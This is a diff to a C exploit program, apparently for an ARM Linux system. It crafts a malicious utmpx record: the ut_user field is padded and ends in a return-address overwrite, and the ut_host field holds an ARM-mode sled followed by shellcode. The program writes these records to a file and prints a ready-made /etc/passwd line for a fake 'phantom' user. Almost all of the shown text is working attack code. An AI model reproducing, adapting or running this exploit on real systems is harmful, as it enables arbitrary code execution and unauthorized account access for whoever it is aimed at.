@@ -25,19 +25,19 @@ int main(int argc, char **argv) {
     int sc_size;
     int ut_size;
 
-    printf("Phantom stack around: %p\n", &ut);
+    fprintf(stderr, "Phantom stack around: %p\n", &ut);
     sc_size = sizeof(shellcode) - 1; // ignore the null
     ut_size = sizeof(struct utmpx); // ignore the null
 	ut = calloc(UT_COUNT, ut_size);
 
 	if (ut == NULL) return -1;
 	
-	printf("Allocated ut: %p\n", ut);
+	fprintf(stderr, "Allocated ut: %p\n", ut);
 
 	//Prepare the space...
 	ut->ut_type = USER_PROCESS;
 	memset(ut, 0x61, ut_size);
-	strcpy(ut->ut_user,"phantom\xa4\x25\x8c\x7eZ"); //0x7e8c25a4
+	strcpy(ut->ut_user,"AAAAAAAAAAAAAAAAphantom\xa4\x25\x8c\x7eWXYZ"); //0x7e8c25a4
   // Build an ARM mode sled...
 	wmemset((wchar_t *)&ut->ut_host, 0xe1a01001, __UT_HOSTSIZE / sizeof(wchar_t));
     memcpy(&ut->ut_host[__UT_HOSTSIZE - sc_size], shellcode, sc_size);
@@ -45,19 +45,19 @@ int main(int argc, char **argv) {
 	//Pre-flight checks
 	pw = getpwnam(ut->ut_user);
 	if (pw == NULL) {
-		printf("Failed to get user '%s' from /etc/passwd\n", ut->ut_user);
+		printf("%s:x:65535:65535::/tmp:/usr/sbin/nologin\n", ut->ut_user);
 		return -1;
 	}
 	
 	fp = fopen("mtmp", "w");
 	if (fp == NULL)	{
-		printf("Failed to open...\n");
+		fprintf(stderr, "Failed to open...\n");
 		return -1;
 	}
 	
 	n = fwrite(ut, sizeof(struct utmpx), UT_COUNT, fp);
 	if (n < UT_COUNT) {
-		printf("Failed to write expected size... wrote: %d\n", n);
+		fprintf(stderr, "Failed to write expected size... wrote: %d\n", n);
 		return -1;
 	}
 	fclose(fp);
